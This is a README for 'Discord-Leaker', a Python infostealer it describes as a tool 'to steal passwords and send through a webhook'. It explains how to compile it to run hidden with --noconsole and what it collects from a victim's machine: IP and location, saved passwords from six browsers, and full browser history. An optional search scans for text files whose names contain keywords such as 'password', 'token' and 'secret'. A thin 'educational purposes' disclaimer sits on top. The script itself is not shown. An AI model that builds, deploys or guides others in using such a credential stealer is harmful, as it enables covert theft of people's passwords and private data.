# Discord-Leaker
Simple python tool to steal passwords and send through a webhook.

# Disclaimer
This tool/script is provided for educational purposes only and is made with purely educational intent. I am not responsible for any damages or consequences that may come from its use.

I take no part in, nor do I endorse, any activities you choose to perform or add with this tool.

# Editing
make sure to change these attributes :

![screenshot](https://github.com/UnafeDev/Discord-Leaker/blob/main/image1.png)

you need to get location finding you need to get an api key from https://ipinfo.io/
# Compiling
drag and drop the py file into "pyinstaller.exe" and it will give options "--noconsole" (hidden) or with console (shows up when run)

![screenshot](https://github.com/UnafeDev/Discord-Leaker/blob/main/drag.png)

or run the command : 
pyinstaller --clean --onefile --noconsole -i NONE {script} (hidden)

pyinstaller --clean --onefile -i NONE (shown)

# Dependencies

pip install requests pywin32 pycryptodome

# Usage
When run on the host's computer, it will dump info into the server where it's located

the info being the following :

IP & LOCATION

Passwords from popular browsers (chrome, edge, firefox, brave, opera, opera gx)

- ONLY IF ENABLED WILL SEARCH FOR TEXT FILES WITH THE FOLOWING LABELS : "password", "pw", "apple", "important", "secret", "key", "login", "account", "credentials", "access", "private", "confidential", "secure", "code", "token", "phrase", "pin","credentials", "auth", "key", "secret"

Browser history (all time)

# Note
to enable the text file search go to this point in the code and un-note it :

![screenshot](https://github.com/UnafeDev/Discord-Leaker/blob/main/image2.png)
